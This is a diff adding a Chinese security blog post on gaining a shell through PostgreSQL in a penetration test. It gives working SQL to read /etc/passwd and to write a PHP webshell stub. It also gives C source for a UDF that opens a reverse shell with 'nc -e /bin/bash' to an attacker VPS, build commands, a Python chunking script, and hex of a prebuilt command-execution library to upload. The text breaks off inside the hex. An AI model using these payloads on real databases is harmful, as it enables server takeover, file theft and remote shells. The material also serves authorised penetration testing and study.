@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+<title>渗透中利用postgresql getshell - JF &#39; blog</title>
+<meta name="keywords" content="hexo,hexone">
+<meta name="description" content="a theme based on bootstrap">
+<meta name="author" content="John Doe">
+<meta name="generator" content="hexo">
+<meta name="jsonContent" content="/content.json">
+
+<link rel="alternate" href="/atom.xml" title="JF ' blog">
+
+<!-- Bootstrap -->
+<link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/style.css">
+
+  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+<link rel="alternate" href="/atom.xml" title="JF ' blog" type="application/atom+xml">
+</head>
+<body class="bg">
+  <div class="container">
+    <header id="header" class="header">
+    <div class="site-info hidden-xs">
+        <p class="title">JF &#39; blog</p>
+        <p></p>
+        <p class="lead">Information is beautiful</p>
+        <!--<p class="subtitle">Information is beautiful</p>-->
+        <!--<p class="author">by John Doe</p>-->
+    </div>
+    <div class="nav-box">
+        <nav id="navbar" class="navbar navbar-inverse">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Brand and toggle get grouped for better mobile display -->
+                    <div class="navbar-header">
+                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#hexone-navbar-collapse" aria-expanded="false">
+                            <span class="sr-only">Toggle navigation</span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </button>
+                        <a href="/" class="navbar-brand visible-xs-inline">JF &#39; blog</a>
+                    </div>
+
+                    <!-- Collect the nav links, forms, and other content for toggling -->
+                    <div class="collapse navbar-collapse">
+                        <ul class="nav navbar-nav">
+                            
+                                
+                                    <li class><a href="/">首页</a></li>
+                                
+                                <li class="divider-vertical"></li>
+                            
+                                
+                                    <li class><a href="/archives">归档</a></li>
+                                
+                                <li class="divider-vertical"></li>
+                            
+                                
+                                    <li class><a href="/about.html">关于</a></li>
+                                
+                                <li class="divider-vertical"></li>
+                            
+                                
+                                    <li class="active"><a>渗透中利用postgresql getshell</a></li>
+                                
+                                <li class="divider-vertical"></li>
+                            
+                        </ul>
+                    </div>
+                </div><!-- /.navbar-collapse -->
+            </div><!-- /.container-fluid -->
+        </nav>
+    </div>
+</header>
+    <div class="row">
+      <section id="main" class="col-md-9 main">
+<article id="post-渗透测试/渗透中利用postgresql getshell" class="article">
+  
+    <h1 class="title"><a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8postgresql%20getshell/">渗透中利用postgresql getshell</a></h1>
+  
+    <p class="info">
+  <span class="info-item">日期: <a href="/archives/2018/01" class="date" title="22:14:23">2018-01-06</a></span>
+  <span class="info-item">更新: <a href="javascript: void(0)" class="date" title="18:26:55">2020-04-07</a></span>
+  <span class="info-item">分类: <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span>
+</p>
+  
+    <div class="content">
+  <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>研究postgresql数据库如何getshell是在渗透中遇到一个pgAdmin的web管理页面可以直接操作postgresql且通过网上的文章没有达到9.6版本getshell的效果所以便有了以下文章。<strong>解决新版本写入函数so文件创建函数失败问题.</strong></p>
+<h2 id="0x01-postgresql测试环境搭建"><a href="#0x01-postgresql测试环境搭建" class="headerlink" title="0x01 postgresql测试环境搭建"></a>0x01 postgresql测试环境搭建</h2><p>安装过程: devel库一定要安装后面用来编译后面需要扩展库postgres.h</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install postgresql96-server postgresql96-contrib postgresql-devel  postgresql-libs</span><br></pre></td></tr></table></figure>
+
+<p>postgresql默认不支持用root启动所以需要建立用户:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd postgres</span><br><span class="line">passwd postgres</span><br></pre></td></tr></table></figure>
+<p>然后需要建立一个data目录并给postgres用户为所有者权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/pgsql-9.6/data</span><br><span class="line">chown -R postgres /usr/pgsql-9.6/data</span><br></pre></td></tr></table></figure>
+<p>然后在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/pgsql-9.6/bin/initdb 初始数据库(必须做)</span><br></pre></td></tr></table></figure>
+<p>启动数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/pgsql-9.6/bin/pg_ctl -D /usr/pgsql-9.6/data -l logfile start</span><br></pre></td></tr></table></figure>
+<p>关闭数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/pgsql-9.6/bin/pg_ctl stop</span><br></pre></td></tr></table></figure>
+<p>进入数据库命令行界面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql -d template1</span><br></pre></td></tr></table></figure>
+<p>创建数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE postgre;</span><br></pre></td></tr></table></figure>
+
+<p>查看密码 密码=MD5(user+password)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT usename, passwd FROM pg_shadow;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-读写文件"><a href="#0x02-读写文件" class="headerlink" title="0x02 读写文件"></a>0x02 读写文件</h2><p>因为和mysql一样利用UDF进行提权所以需要上传文件</p>
+<h4 id="1-读文件"><a href="#1-读文件" class="headerlink" title="1.读文件"></a>1.读文件</h4><h5 id="1-1-创建数据表把读到的文件copy入表"><a href="#1-1-创建数据表把读到的文件copy入表" class="headerlink" title="1.1 创建数据表把读到的文件copy入表:"></a>1.1 创建数据表把读到的文件copy入表:</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> wooyun;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> wooyun(t <span class="built_in">TEXT</span>);</span><br><span class="line">COPY wooyun FROM '/etc/passwd';</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> wooyun <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-2-利用postgresql大对象处理来读文件"><a href="#1-2-利用postgresql大对象处理来读文件" class="headerlink" title="1.2 利用postgresql大对象处理来读文件:"></a>1.2 利用postgresql大对象处理来读文件:</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> lo_import(<span class="string">'/etc/passwd'</span>,<span class="number">12345678</span>);</span><br><span class="line"><span class="keyword">select</span> array_agg(b)::<span class="built_in">text</span>::<span class="built_in">int</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">encode</span>(<span class="keyword">data</span>,<span class="string">'hex'</span>)b,pageno <span class="keyword">from</span> pg_largeobject <span class="keyword">where</span> loid=<span class="number">12345678</span> <span class="keyword">order</span> <span class="keyword">by</span> pageno)a</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-写文件"><a href="#2-写文件" class="headerlink" title="2.写文件"></a>2.写文件</h4><h5 id="2-1-普通文件写入-webshell"><a href="#2-1-普通文件写入-webshell" class="headerlink" title="2.1 普通文件写入(webshell):"></a>2.1 普通文件写入(webshell):</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COPY (<span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span>) <span class="keyword">to</span> <span class="string">'/tmp/1.php'</span>;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-2-二进制文件写入-利用大数据对象"><a href="#2-2-二进制文件写入-利用大数据对象" class="headerlink" title="2.2 二进制文件写入(利用大数据对象):"></a>2.2 二进制文件写入(利用大数据对象):</h5><p>这里需要分片进行上传就是将文件分成小于等于2KB大小的hex再进行上传,但是在9.6版本中(我测试的版本)必须切割<strong>等于2KB的数据上传才会成功</strong>,具体到命令执行处详细说明.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR:  pg_largeobject entry for OID 2008, page 0 has invalid data field size 2378</span><br></pre></td></tr></table></figure>
+<p>首先创建一个OID作为写入的对象,然后通过0,1,2,3…分片上传但是对象都为12345最后导出到/tmp目录下,收尾删除OID</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">12345</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">0</span>, <span class="keyword">decode</span>(<span class="string">'7f454c4...0000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">1</span>, <span class="keyword">decode</span>(<span class="string">'0000000...0000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">2</span>, <span class="keyword">decode</span>(<span class="string">'f604000...0000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">3</span>, <span class="keyword">decode</span>(<span class="string">'0000000...7400'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">12345</span>, <span class="string">'/tmp/test.so'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> lo_unlink(<span class="number">12345</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-命令执行"><a href="#0x03-命令执行" class="headerlink" title="0x03 命令执行"></a>0x03 命令执行</h2><h5 id="1-1-低版本的命令执行"><a href="#1-1-低版本的命令执行" class="headerlink" title="1.1 低版本的命令执行"></a>1.1 低版本的命令执行</h5><p>可以直接调用/lib/libc.so.6或者是/lib64/libc.so.6</p>
+<p>一般<strong>8.2</strong>以下的版本可以</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> <span class="keyword">system</span>(cstring) <span class="keyword">RETURNS</span> <span class="built_in">int</span> <span class="keyword">AS</span> <span class="string">'/lib/libc.so.6'</span>, <span class="string">'system'</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">STRICT</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> <span class="keyword">system</span>(cstring) RcETURNS <span class="built_in">int</span> <span class="keyword">AS</span> <span class="string">'/lib64/libc.so.6'</span>, <span class="string">'system'</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">STRICT</span>;</span><br></pre></td></tr></table></figure>
+<p>直接可以执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(<span class="string">'id'</span>);</span><br></pre></td></tr></table></figure>
+<h5 id="1-2-高版本的命令执行"><a href="#1-2-高版本的命令执行" class="headerlink" title="1.2 高版本的命令执行"></a>1.2 高版本的命令执行</h5><p>当postgresql版本高于8.2存在安全机制无法调用系统libc.so.6所以需要自己利用UDF进行命令执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR:  incompatible library "xxx.so": missing magic block</span><br><span class="line">HINT:  Extension libraries are required to <span class="keyword">use</span> the PG_MODULE_MAGIC macro.</span><br></pre></td></tr></table></figure>
+
+<p>第一步可以先查看postgresql支持的扩展语言:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> pg_language;</span><br></pre></td></tr></table></figure>
+<p>如果支持python perl就很简单和低版本一样直接创建调用详情可参考以下文章:<br><a href="http://static.hx99.net/static/drops/tips-6449.html" target="_blank" rel="external nofollow noopener noreferrer">http://static.hx99.net/static/drops/tips-6449.html</a></p>
+<p>当不存在其他扩展语言时,postgresql默认支持C,所以要自己传一个编译好的so库去创建可执行命令函数.这里可以使用简短的反弹shell后门</p>
+<p>编译反弹shell后门</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"postgres.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"fmgr.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">text</span> *<span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"nc -e /bin/bash vpsIPaddress 2333"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译环境见文章头部这个需要在/usr/pgsql-9.6/include/server/目录下执行应为存在postgres.h头部调用的库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc hack.c -I`pg_config --includedir-server` -fPIC -shared -o udf.so</span><br><span class="line">strip -sx udf.so <span class="comment">#缩减so文件大小</span></span><br></pre></td></tr></table></figure>
+
+<p>将文件hex后去除\n</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat udf.so | xxd -ps | tr -d <span class="string">"\n"</span></span><br></pre></td></tr></table></figure>
+<p>接下来我们需要将udf.so文件分割成每2048字节的块,最后一个块的大小不满足2048字节不需要考虑.<br>为什么不能小于2048?是因为在postgresql高版本处理中,<strong>如果块之间小于2048,默认会用0去填充让块达到2048字节所以上传的文件才会一直创建函数失败</strong>.</p>
+<p>用python脚本去分割udf.so文件,2个16进制数是一个字节所以按照4096个16进制数分割：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#~/usr/bin/env python 2.7</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">number = randint(<span class="number">1000</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage:python "</span> + sys.argv[<span class="number">0</span>] + <span class="string">"inputfile"</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    fileobj = open(sys.argv[<span class="number">1</span>],<span class="string">'rb'</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    t = <span class="number">-1</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> fileobj.read():</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        s += b</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">4096</span> == <span class="number">0</span>:</span><br><span class="line">            t = t + <span class="number">1</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'insert into pg_largeobject values (&#123;number&#125;, &#123;block&#125;, decode(\'&#123;payload&#125;\',\'hex\'));\n'</span>\</span><br><span class="line">                    .format(number=number, block=t, payload=s)</span><br><span class="line">            s = <span class="string">''</span></span><br><span class="line">    fileobj.close()</span><br></pre></td></tr></table></figure>
+<p>分割完成后按照下文中的sql语句执行：<br>1.写入对象<br>2.创建文件<br>3.建立函数<br>4.执行命令<br>5.清理函数</p>
+<p>如果不能反弹shell也可以使用sqlmap提供的UDF命令执行的函数：<br><a href="https://github.com/sqlmapproject/udfhack/blob/master/linux/lib_postgresqludf_sys/lib_postgresqludf_sys.c" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/sqlmapproject/udfhack/blob/master/linux/lib_postgresqludf_sys/lib_postgresqludf_sys.c</a></p>
+<p>这里我直接给出hex分片过sql语句直接写入即可创建成功（9.6版本测试有效，如果目标是更加新的版本需要对应安装postgresql-dev扩展包编译代码）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">9023</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pg_largeobject <span class="keyword">values</span> (<span class="number">9023</span>, <span class="number">0</span>, <span class="keyword">decode</span>(<span class="string">'7f454c4602010100000000000000000003003e0001000000000d0000000000004000000000000000e8210000000000000000000040003800070040001a00190001000000050000000000000000000000000000000000000000000000000000004c140000000000004c1400000000000000002000000000000100000006000000f81d000000000000f81d200000000000f81d200000000000d802000000000000e00200000000000000002000000000000200000006000000181e000000000000181e200000000000181e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e5746404000000cc11000000000000cc11000000000000cc110000000000006c000000000000006c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000f81d000000000000f81d200000000000f81d200000000000080200000000000008020000000000000100000000000000040000001400000003000000474e550052705bc9352a28aa252e8edf0fbc5d4c32e634e800000000030000001a00000002000000070000008440030810890c99880c008dc84400001a0000002100000026000000325e541ea868be124245d5ec2e67541eaa5fbe12bae3927c5f4de3214aad229d32a1f45bd871581cb88df10e25681b32c60da6d4ead3ef0e6637d3ed339268fe000000000000000000000000000000000000000000000000000000000000000003000900580b0000000000000000000000000000de00000012000000000000000000000000000000000000000901000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000007601000012000000000000000000000000000000000000006f01000012000000000000000000000000000000000000003a0100001200000000000000000000000000000000000000d60000001200000000000000000000000000000000000000110100001200000000000000000000000000000000000000fb0000001200000000000000000000000000000000000000690100001200000000000000000000000000000000000000010000002000000000000000000000000000000000000000c500000010000000000000000000000000000000000000009800000012000000000000000000000000000000000000006301000012000000000000000000000000000000000000000101000012000000000000000000000000000000000000003f0100001200000000000000000000000000000000000000f500000012000000000000000000000000000000000000005d0100001200000000000000000000000000000000000000320100001200000000000000000000000000000000000000610000002000000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000dd00000010000000000000000000000000000000000000002d0100001200000000000000000000000000000000000000e300000012000b00d20e0000000000000800000000000000bc00000012000b00850e0000000000004d000000000000008601000010001600d0202000000000000000000000000000b300000012000b007d0e0000000000000800000000000000ec00000012000b00da0e000000000000c3000000000000009901000010001700d82020000000000000000000000000005001000012000b003b1000000000000031010000000000001801000012000b009d0f00000000000008000000000000008300000012000b00ed0d00000000000030000000000000008d01000010001700d02020000000000000000000000000001000000012000900580b00000000000000000000000000002101000012000b00a50f0000000000008e000000000000007500000012000b00e50d00000000000008000000000000001600000012000c006c1100000000000000000000000000004701000012000b00331000000000000008000000000000009f00000012000b001d0e0000000000006000000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c61737365730050675f6d616769635f66756e6300746578745f7074725f746f5f636861725f707472006d616c6c6f63006368725f7074725f746f5f746578745f7074720070675f66696e666f5f7379735f657865630070675f6465746f6173745f646174756d0073797374656d0070667265650070675f66696e666f5f7379735f6576616c00706f70656e006667657473007265616c6c6f63007374726e6370790070636c6f73650070675f66696e666f5f7379735f62696e6576616c00666f726b00737973636f6e66006d6d617000776169747069640070675f66696e666f5f7379735f66696c657265616400666f70656e00667365656b006674656c6c0066636c6f7365006672656164006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e3500000000000200'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pg_largeobject <span class="keyword">values</span> (<span class="number">9023</span>, <span class="number">1</span>, <span class="keyword">decode</span>(<span class="string">'0200000002000200020002000200020002000000000002000200020002000200020002000000000002000000020001000100010001000100010001000100010001000100010001000100010001000000010001007c0100001000000000000000751a6909000002009e01000000000000f81d2000000000000800000000000000b00d000000000000001e2000000000000800000000000000700d000000000000101e2000000000000800000000000000101e200000000000d81f20000000000006000000040000000000000000000000e01f200000000000060000000c0000000000000000000000e81f20000000000006000000150000000000000000000000f01f20000000000006000000160000000000000000000000f81f200000000000060000001700000000000000000000001820200000000000070000000200000000000000000000002020200000000000070000000300000000000000000000002820200000000000070000000500000000000000000000003020200000000000070000000600000000000000000000003820200000000000070000000700000000000000000000004020200000000000070000000800000000000000000000004820200000000000070000000900000000000000000000005020200000000000070000000a00000000000000000000005820200000000000070000002200000000000000000000006020200000000000070000000b00000000000000000000006820200000000000070000000c00000000000000000000007020200000000000070000000d00000000000000000000007820200000000000070000000e00000000000000000000008020200000000000070000000f0000000000000000000000882020000000000007000000100000000000000000000000902020000000000007000000110000000000000000000000982020000000000007000000120000000000000000000000a02020000000000007000000130000000000000000000000a82020000000000007000000140000000000000000000000b02020000000000007000000170000000000000000000000b82020000000000007000000180000000000000000000000c02020000000000007000000190000000000000000000000c820200000000000070000002900000000000000000000004883ec08488b057d1420004885c07405e8c30000004883c408c30000000000000000000000000000ff3582142000ff25841420000f1f4000ff25821420006800000000e9e0ffffffff257a1420006801000000e9d0ffffffff25721420006802000000e9c0ffffffff256a1420006803000000e9b0ffffffff25621420006804000000e9a0ffffffff255a1420006805000000e990ffffffff25521420006806000000e980ffffffff254a1420006807000000e970ffffffff25421420006808000000e960ffffffff253a1420006809000000e950ffffffff2532142000680a000000e940ffffffff252a142000680b000000e930ffffffff2522142000680c000000e920ffffffff251a142000680d000000e910ffffffff2512142000680e000000e900ffffffff250a142000680f000000e9f0feffffff25021420006810000000e9e0feffffff25fa1320006811000000e9d0feffffff25f21320006812000000e9c0feffffff25ea1320006813000000e9b0feffffff25e21320006814000000e9a0feffffff25da1320006815000000e990feffffff25d21320006816000000e980feffff488d05d0132000488d3dc2132000554829f84889e54883f80e77025dc3488b05b41220004885c074f25dffe00f1f4000488d0599132000488d3d92132000554829f84889e548c1f8034889c248c1ea3f4801d048d1f875025dc3488b158f1220004885d274f25d4889c6ffe20f1f4000803d5913200000752748833d7712200000554889e5740c488d3d82102000e82dffffffe868ffffff5dc6053013200001f3c30f1f4000662e0f1f84000000000048833d50102000007426488b05271220004885c0741a55488d3d3a1020004889e5ffd05de957ffffff0f1f8000000000e94bffffff488d05c4030000c355534889fb508b17c1ea028d6afc8d7d014863ffe84afeffff4863d5488d73044889c74889d1f3a4c60410005a5b5dc341544983ccff4c89e15531ed4088e8534889fbf2ae48f7d1488d7903e812feffff4889df4889c24c89e14088e84889def2ae4889df48f7d18d048d0c0000004c89e189024088e8f2ae488d420448f7d14c01e14889c74889d0f3a45b5d415cc3488d0528030000c341554154554889fd5351488b7f20e8a8fdffff4889c74889c3e86dfdffff4989c44889c7e832fdffff4c89e74189c5e8d7fcffff483b5d2074084889dfe809feffff5a5b5d415c4489e8415dc3488d05cf020000c34157415641554154555352488b7f20e852fdffff4889c7e81afdffffbf000400004889c5e84dfdffffbf010000004989c4e840fdffff488d35690200004889efc600004889c331ede869fdffff4989c54c89eabe080000004c89e7e8c6fcffff4885c0743931c04c89e74883c9fff2ae4889df48f7d14c8d71ff468d7c35004963f7e80ffdffff488d3c284963d64c89e64889c34963efe82afcffffebb24c89efe870fcffff803b007405c6442bff00584889df5b5d415c415d415e415fe953fdffff488d0500020000c341545553488b7f20e88efcffff4989c48b28e824fdffff85c07907b801000000eb677555c1ed02bf1e000000e8dafcffff83ed04488d70ff4531c94863ed4531c031ff488d042e48f7d6b921000000ba070000004821c6e8cffbff'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pg_largeobject <span class="keyword">values</span> (<span class="number">9023</span>, <span class="number">2</span>, <span class="keyword">decode</span>(<span class="string">'ff4883f8ff4889c374b6498d7424044889ea4889c7e886fbffffffd3eb0eba0100000031f689c7e854fcffff31c05b5d415cc3488d0566010000c341574989ff41564155415455534883ec28488b7f20e8ebfbffff488d7c240f488d3524010000b911000000f3a44889c7e8a0fbffff488d350b0100004889c74989c4e81efcffff4885c04889c3744431f6ba020000004889c7e8c7fbffff4889dfe87ffbffff31d231f64889c54889df4189c5e8adfbffff8d7d014863ffe892fbffff4885c04989c675144889dfe8f2faffff41c6471c0131c0e9830000004889d9ba010000004863f54889c7e8c3faffff4889dfe8cbfaffff8d7c2d014863ffe84ffbffff31d24889c34139d58d04127e23418a041688c183e00fc0e9048a44040f83e10f8a4c0c0f88445301880c5348ffc2ebd548984889dfc6040300e8b1fbffff4889df4889c5e846faffff4c89f7e83efaffff4c89e7e836faffff4889e84883c4285b5d415c415d415e415fc34883ec084883c408c300000000000000000000007200726200303132333435363738394142434445460000000000000000000000010000000100000001000000010000001c0000008a0300006400000020000000400000000100000001000000011b033b680000000c000000b4f9ffff8400000019fcffffac00000021fcffffc400000051fcffffec000000b1fcffff1c010000b9fcffff3401000006fdffff6c0100000efdffff84010000d1fdffffcc010000d9fdffffe401000067feffff140200006ffeffff2c0200001400000000000000017a5200017810011b0c070890010000240000001c00000028f9ffff80010000000e10460e184a0f0b770880003f1a3b2a33242200000000140000004400000065fbffff080000000000000000000000240000005c00000055fbffff3000000000410e108602410e188303440e20670e18410e10410e08002c000000840000005dfbffff6000000000420e108c02480e188603460e208304024c0e18410e10420e0800000000000014000000b40000008dfbffff08000000000000000000000034000000cc0000007dfbffff4d00000000420e108d02420e188c03410e208604440e288305410e30790e28410e20410e18420e10450e0800140000000401000092fbffff080000000000000000000000440000001c01000082fbffffc300000000420e108f02420e188e03420e208d04420e288c05410e308606410e388307410e4002a60e38440e30410e28420e20420e18420e10420e081400000064010000fdfbffff0800000000000000000000002c0000007c010000edfbffff8e00000000420e108c02410e188603410e20830402860e18410e10420e0800000000000014000000ac0100004bfcffff0800000000000000000000004c000000c40100003bfcffff3101000000420e108f02450e188e03420e208d04420e288c05410e308606410e388307440e600315010e38410e30410e28420e20420e18420e10420e0800000000000000000000000000000